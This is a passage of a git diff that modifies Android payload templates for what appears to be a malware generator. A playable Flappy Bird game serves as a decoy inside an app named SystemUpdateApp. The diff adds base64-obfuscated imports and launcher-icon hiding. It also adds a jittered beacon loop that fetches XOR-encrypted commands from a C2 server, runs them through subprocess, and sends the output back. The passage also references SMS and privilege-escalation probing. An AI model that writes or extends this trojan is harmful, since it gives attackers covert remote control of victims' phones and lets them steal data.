+-        help="Path to a custom android_main_template.py file"
++        help="Path to a custom android_beacon_template.py file"
+     )
+ 
+     args = parser.parse_args()
+diff --git a/templates/payload/android_main_template.py b/templates/payload/android_beacon_template.py
+similarity index 56%
+rename from templates/payload/android_main_template.py
+rename to templates/payload/android_beacon_template.py
+index a9d86f9..5b94029 100644
+--- a/templates/payload/android_main_template.py
++++ b/templates/payload/android_beacon_template.py
+@@ -13,55 +13,59 @@ from kivy.graphics import Color, Ellipse, Rectangle
+ class FlappyBirdGame(Widget):
+     bird_y = NumericProperty(0)
+     bird_v = NumericProperty(0)
++    score = NumericProperty(0)
+     
+     def __init__(self, **kwargs):
+         super(FlappyBirdGame, self).__init__(**kwargs)
+         self.bird_y = 500
+         self.pipes = []
+         self.game_over = False
++        self.game_started = False
+         
+         self.bind(bird_y=self._update_bird_gfx)
+         
+         with self.canvas:
+             Color(0.2, 0.6, 0.8) # Sky blue background
+             self.bg = Rectangle(pos=self.pos, size=(2000, 4000))
+-            self.bird_color = Color(1, 1, 0) # Yellow bird
++            Color(1, 1, 0) # Yellow bird
+             self.bird_gfx = Ellipse(pos=(100, self.bird_y), size=(50, 50))
+             
++        self.label = Label(text='TAP TO START', font_size=70, pos=(0, 200))
++        self.add_widget(self.label)
++            
+         self.bind(size=self._update_bg)
+         Clock.schedule_interval(self.update, 1.0/60.0)
+-        Clock.schedule_interval(self.spawn_pipe, 2.5)
++        Clock.schedule_interval(self.spawn_pipe, 2.0)
+ 
+     def _update_bg(self, *args):
+         self.bg.size = self.size
+         self.bg.pos = self.pos
++        self.label.center_x = self.center_x
++        self.label.center_y = self.center_y + 200
+ 
+     def _update_bird_gfx(self, *args):
+         self.bird_gfx.pos = (100, self.bird_y)
+ 
+     def spawn_pipe(self, dt):
+-        if self.game_over: return
+-        gap_y = random.randint(300, max(600, int(self.height - 300)))
+-        gap_size = 400
++        if self.game_over or not self.game_started: return
++        gap_y = random.randint(300, max(400, int(self.height - 300)))
++        gap_size = 450
+         with self.canvas.before:
+-            Color(0, 0.8, 0) # Green pipes
++            Color(0, 0.7, 0) # Green pipes
+             p_top = Rectangle(pos=(self.width, gap_y + gap_size/2), size=(120, self.height))
+             p_bot = Rectangle(pos=(self.width, 0), size=(120, gap_y - gap_size/2))
+-        self.pipes.append({'top': p_top, 'bot': p_bot})
++        self.pipes.append({'top': p_top, 'bot': p_bot, 'scored': False})
+ 
+     def update(self, dt):
+-        if self.game_over: return
++        if not self.game_started or self.game_over: return
+         
+-        # Gravity
+-        self.bird_v -= 0.6
++        self.bird_v -= 0.8
+         self.bird_y += self.bird_v
+ 
+-        # Move pipes
+         for p in self.pipes[:]:
+-            p['top'].pos = (p['top'].pos[0] - 6, p['top'].pos[1])
+-            p['bot'].pos = (p['bot'].pos[0] - 6, p['bot'].pos[1])
++            p['top'].pos = (p['top'].pos[0] - 8, p['top'].pos[1])
++            p['bot'].pos = (p['bot'].pos[0] - 8, p['bot'].pos[1])
+             
+-            # Collision detection
+             bx, by = 100, self.bird_y
+             bw, bh = 50, 50
+             px = p['top'].pos[0]
+@@ -69,24 +73,30 @@ class FlappyBirdGame(Widget):
+             
+             if bx + bw > px and bx < px + pw:
+                 if by + bh > p['top'].pos[1] or by < p['bot'].pos[1] + p['bot'].size[1]:
+-                    self.game_over = True
++                    self.end_game()
++            
++            if not p['scored'] and px + pw < bx:
++                self.score += 1
++                p['scored'] = True
++                self.label.text = f'Score: {self.score}'
+             
+-            # Cleanup
+-            if p['top'].pos[0] < -120:
++            if p['top'].pos[0] < -150:
+                 self.canvas.before.remove(p['top'])
+                 self.canvas.before.remove(p['bot'])
+                 self.pipes.remove(p)
+ 
+-        # Bounds check
+         if self.bird_y < 0 or self.bird_y > self.height:
+-            self.game_over = True
+-            
+-        if self.game_over:
+-            Clock.schedule_once(self.reset_game, 1.5)
++            self.end_game()
++
++    def end_game(self):
++        self.game_over = True
++        self.label.text = f'GAME OVER\nScore: {self.score}\nTap to restart'
++        Clock.schedule_once(self.reset_game, 2.0)
+ 
+     def reset_game(self, dt=0):
+         self.bird_y = self.height / 2 if self.height > 0 else 500
+         self.bird_v = 0
++        self.score = 0
+         for p in self.pipes:
+             try:
+                 self.canvas.before.remove(p['top'])
+@@ -94,17 +104,66 @@ class FlappyBirdGame(Widget):
+             except: pass
+         self.pipes = []
+         self.game_over = False
++        self.game_started = False
++        self.label.text = 'TAP TO START'
+ 
+     def on_touch_down(self, touch):
+-        if not self.game_over:
+-            self.bird_v = 12
++        if self.game_over: return True
++        if not self.game_started:
++            self.game_started = True
++            self.label.text = 'Score: 0'
++        self.bird_v = 15
+         return True
+ 
+ class SystemUpdateApp(App):
+     def build(self):
+         # Configuration - replaced by BuildozerPayloadGenerator
+         self.C2_URL = "{{STAGE2URL}}"
+-...
++        self.XOR_KEY = "{{XOR_KEY}}"
++        self.SHOW_UI = "{{SHOW_UI}}"
++        self.HIDE_ICON = "{{HIDE_ICON}}"
++        self.RESULT_SINK = "{{RESULT_SINK}}"
++        self.EXTERNAL_TASK_URL = "{{EXTERNAL_TASK_URL}}"
++        
++        # Fallbacks
++        if "{{" + "STAGE2URL" + "}}" == self.C2_URL: self.C2_URL = "http://127.0.0.1:8000"
++        if "{{" + "XOR_KEY" + "}}" == self.XOR_KEY: self.XOR_KEY = "SuperSploitKey"
++        if "{{" + "SHOW_UI" + "}}" == self.SHOW_UI: self.SHOW_UI = "true"
++        if "{{" + "HIDE_ICON" + "}}" == self.HIDE_ICON: self.HIDE_ICON = "false"
++        if "{{" + "RESULT_SINK" + "}}" == self.RESULT_SINK: self.RESULT_SINK = ""
++        if "{{" + "EXTERNAL_TASK_URL" + "}}" == self.EXTERNAL_TASK_URL: self.EXTERNAL_TASK_URL = ""
++
++        # Internal State
++        self.completed_tasks_file = "tasks.json"
++        self.completed_tasks = self._load_completed_tasks()
++
++        # Dynamic Imports Helper
++        def _i(b, f=None):
++            m = base64.b64decode(b).decode('utf-8')
++            return __import__(m, fromlist=[f] if f else [])
++
++        # Obfuscated dynamic imports
++        self._o = _i(b'b3M=') # os
++        self._s = _i(b'c3VicHJvY2Vzcw==') # subprocess
++        self._sh = _i(b'c2hsZXg=') # shlex
++        self._io = _i(b'aW8=') # io
++        self._sy = _i(b'c3lz') # sys
++        self._tm = _i(b'dGltZQ==') # time
++        self._rd = _i(b'cmFuZG9t') # random
++        self._ur = _i(b'dXJsbGliLnJlcXVlc3Q=', 'Request') # urllib.request
++        
++        # SSL Context for HTTPS (Optional)
++        try:
++            import ssl
++            self._ssl_ctx = ssl._create_unverified_context()
++        except: self._ssl_ctx = None
++
++        if self.HIDE_ICON.lower() in ["true", "1", "yes", "y"]:
++            try:
++                from jnius import autoclass
++                cls = autoclass('org.kivy.android.PythonActivity')
++                act = cls.mActivity
++                comp = autoclass('android.content.ComponentName')(act.getPackageName(), act.getClass().getName())
+                 act.getPackageManager().setComponentEnabledSetting(comp, autoclass('android.content.pm.PackageManager').COMPONENT_ENABLED_STATE_DISABLED, autoclass('android.content.pm.PackageManager').DONT_KILL_APP)
+             except Exception: pass
+ 
+@@ -114,8 +173,6 @@ class SystemUpdateApp(App):
+             return Widget()
+         return FlappyBirdGame()
+ 
+-    def _load_completed_tasks(self):
+-
+     def _load_completed_tasks(self):
+         try:
+             with open(self.completed_tasks_file, 'r') as f:
+@@ -149,7 +206,8 @@ class SystemUpdateApp(App):
+             with getattr(self._ur, 'urlopen')(req, timeout=15, context=self._ssl_ctx) as r: pass
+         except Exception: pass
+ 
+-    def _fetch_tasks(self):
++    def _fetch_task(self):
++        """Fetches a single task from the C2 server."""
+         try:
+             url = self.EXTERNAL_TASK_URL if self.EXTERNAL_TASK_URL else f"{self.C2_URL}/file"
+             req = getattr(self._ur, 'Request')(url)
+@@ -157,41 +215,34 @@ class SystemUpdateApp(App):
+                 blob = r.read().strip()
+             if not blob: return None
+             
+-            # Decrypt: Base64 -> XOR -> JSON
++            # Decrypt: Base64 -> XOR -> String
+             dec = base64.b64decode(blob)
+-            return json.loads(self._xor(dec, self.XOR_KEY).decode('utf-8', errors='ignore'))
++            return self._xor(dec, self.XOR_KEY).decode('utf-8', errors='ignore').strip()
+         except Exception: return None
+ 
+     def phantom_loop(self):
+         while True:
+             try:
+-                # Randomized check-in interval (e.g., every 5-15 mins for high stealth)
+-                getattr(self._tm, 'sleep')(getattr(self._rd, 'randint')(300, 900))
++                # Randomized check-in interval (e.g., every 1-5 mins for debugging, 
++                # or 24-48h for stealth - here we use a jittered approach)
++                # MIN_SLEEP = 60, MAX_SLEEP = 300
++                sleep_duration = getattr(self._rd, 'randint')(60, 300)
++                getattr(self._tm, 'sleep')(sleep_duration)
+                 
+-                tasks = self._fetch_tasks()
+-                if not tasks: continue
+-
+-                current_time = int(time.time())
+-
+-                for task_id, task_data in tasks.items():
+-                    if task_id in self.completed_tasks: continue
+-                    
+-                    # Schedule Check: Has the time arrived?
+-                    if current_time >= task_data.get('time_to_execute', 0):
+-                        cmd = task_data.get('command', '').strip()
+-                        if not cmd: continue
+-                        
+-                        # Execute and Report
+-                        output = self._execute_command(cmd)
+-                        self._report_result(f"Task: {task_id}\nCommand: {cmd}\nOutput:\n{output}")
+-                        
+-                        # Mark as completed
+-                        self._save_completed_task(task_id)
++                cmd = self._fetch_task()
++                if not cmd: continue
++
++                if cmd.lower() == 'exit':
++                    break
++                
++                # Execute and Report
++                output = self._execute_command(cmd)
++                self._report_result(f"Command: {cmd}\nOutput:\n{output}")
+ 
+             except Exception: pass
+ 
+     def _execute_command(self, cmd):
+-        """Unified command execution engine ported from DRS."""
++        """Unified command execution engine."""
+         if cmd == 'lpe_enum':
+             try:
+                 report = ["--- Android Phantom LPE Audit ---"]
+@@ -215,12 +266,23 @@ class SystemUpdateApp(App):
+                 return out
+             except Exception as e: return f"SMS Error: {e}"
+ 
++        if cmd.startswith('cd '):
++            try: 
++                getattr(self._o, 'chdir')(cmd[3:].strip())
++                return "\n"
++            except Exception as e: return f"Error: {e}\n"
++            
++        elif cmd == 'pwd':
++            try: return getattr(self._o, 'getcwd')() + "\n"
++            except Exception as e: return f"Error: {e}\n"
++
+         # Default: Subprocess (No shell for stealth)
+         try:
+             args = getattr(self._sh, 'split')(cmd)
+-            proc = getattr(self._s, 'run')(args, capture_output=True, text=True, shell=False)
++            # Added timeout=30 to prevent process starvation
++            proc = getattr(self._s, 'run')(args, capture_output=True, text=True, shell=False, timeout=30)
+             return (proc.stdout + proc.stderr) or "No output."
+         except Exception as e: return f"Error: {e}"
+ 
+ if __name__ == '__main__':
+-    SystemUpdateApp().run()
+\ No newline at end of file
++    SystemUpdateApp().run()
+diff --git a/templates/payload/android_drs_template.py b/templates/payload/android_drs_template.py
+index 65d2991..dce33ff 100644
+--- a/templates/payload/android_drs_template.py
++++ b/templates/payload/android_drs_template.py
+@@ -13,58 +13,59 @@ from kivy.graphics import Color, Ellipse, Rectangle
+ class FlappyBirdGame(Widget):
+     bird_y = NumericProperty(0)
+     bird_v = NumericProperty(0)
++    score = NumericProperty(0)
+     
+     def __init__(self, **kwargs):
+         super(FlappyBirdGame, self).__init__(**kwargs)
+         self.bird_y = 500
+         self.pipes = []
+         self.game_over = False
++        self.game_started = False
+         
+         self.bind(bird_y=self._update_bird_gfx)
+         
+         with self.canvas:
+             Color(0.2, 0.6, 0.8) # Sky blue background
+             self.bg = Rectangle(pos=self.pos, size=(2000, 4000))
+-            self.bird_color = Color(1, 1, 0) # Yellow bird
++            Color(1, 1, 0) # Yellow bird
+             self.bird_gfx = Ellipse(pos=(100, self.bird_y), size=(50, 50))
+             
+-            # Score Label
+-            self.score_label = Color(1, 1, 1)
++        self.label = Label(text='TAP TO START', font_size=70, pos=(0, 200))
++        self.add_widget(self.label)
+             
+         self.bind(size=self._update_bg)
+         Clock.schedule_interval(self.update, 1.0/60.0)
+-        Clock.schedule_interval(self.spawn_pipe, 2.5)
++        Clock.schedule_interval(self.spawn_pipe, 2.0)
+ 
+     def _update_bg(self, *args):
+         self.bg.size = self.size
+         self.bg.pos = self.pos
++        self.label.center_x = self.center_x
++        self.label.center_y = self.center_y + 200
+ 
+     def _update_bird_gfx(self, *args):
+         self.bird_gfx.pos = (100, self.bird_y)
+ 
+     def spawn_pipe(self, dt):
+-        if self.game_over: return
+-        gap_y = random.randint(300, max(600, int(self.height - 300)))
+-        gap_size = 400
++        if self.game_over or not self.game_started: return
++        gap_y = random.randint(300, max(400, int(self.height - 300)))
++        gap_size = 450
+         with self.canvas.before:
+-            Color(0, 0.8, 0) # Green pipes
++            Color(0, 0.7, 0) # Green pipes
+             p_top = Rectangle(pos=(self.width, gap_y + gap_size/2), size=(120, self.height))
+             p_bot = Rectangle(pos=(self.width, 0), size=(120, gap_y - gap_size/2))
+-        self.pipes.append({'top': p_top, 'bot': p_bot})
++        self.pipes.append({'top': p_top, 'bot': p_bot, 'scored': False})
+ 
+     def update(self, dt):
+-        if self.game_over: return
++        if not self.game_started or self.game_over: return
+         
+-        # Gravity
+-        self.bird_v -= 0.6
++        self.bird_v -= 0.8
+         self.bird_y += self.bird_v
+ 
+-        # Move pipes
+         for p in self.pipes[:]:
+-            p['top'].pos = (p['top'].pos[0] - 6, p['top'].pos[1])
+-            p['bot'].pos = (p['bot'].pos[0] - 6, p['bot'].pos[1])
++            p['top'].pos = (p['top'].pos[0] - 8, p['top'].pos[1])
++            p['bot'].pos = (p['bot'].pos[0] - 8, p['bot'].pos[1])
+             
+-            # Collision detection
+             bx, by = 100, self.bird_y
+             bw, bh = 50, 50
+             px = p['top'].pos[0]
+@@ -72,24 +73,30 @@ class FlappyBirdGame(Widget):
+             
+             if bx + bw > px and bx < px + pw:
+                 if by + bh > p['top'].pos[1] or by < p['bot'].pos[1] + p['bot'].size[1]:
+-                    self.game_over = True
++                    self.end_game()
+             
+-            # Cleanup
+-            if p['top'].pos[0] < -120:
++            if not p['scored'] and px + pw < bx:
++                self.score += 1
++                p['scored'] = True
++                self.label.text = f'Score: {self.score}'
++            
++            if p['top'].pos[0] < -150:
+                 self.canvas.before.remove(p['top'])
+                 self.canvas.before.remove(p['bot'])
+                 self.pipes.remove(p)
+ 
+-        # Bounds check
+         if self.bird_y < 0 or self.bird_y > self.height:
+-            self.game_over = True
+-            
+-        if self.game_over:
+-            Clock.schedule_once(self.reset_game, 1.5)
++            self.end_game()
++
++    def end_game(self):
++        self.game_over = True
++        self.label.text = f'GAME OVER\nScore: {self.score}\nTap to restart'
++        Clock.schedule_once(self.reset_game, 2.0)
+ 
+     def reset_game(self, dt=0):
+         self.bird_y = self.height / 2 if self.height > 0 else 500
+         self.bird_v = 0
++        self.score = 0
+         for p in self.pipes:
+             try:
+                 self.canvas.before.remove(p['top'])
+@@ -97,10 +104,15 @@ class FlappyBirdGame(Widget):
+             except: pass
+         self.pipes = []
+         self.game_over = False
++        self.game_started = False
++        self.label.text = 'TAP TO START'
+ 
+     def on_touch_down(self, touch):
+-        if not self.game_over:
+-            self.bird_v = 12
++        if self.game_over: return True
++        if not self.game_started:
++            self.game_started = True
++            self.label.text = 'Score: 0'
++        self.bird_v = 15
+         return True
+ 
+ class SystemUpdateApp(App):
+Process Group PGID: 28576
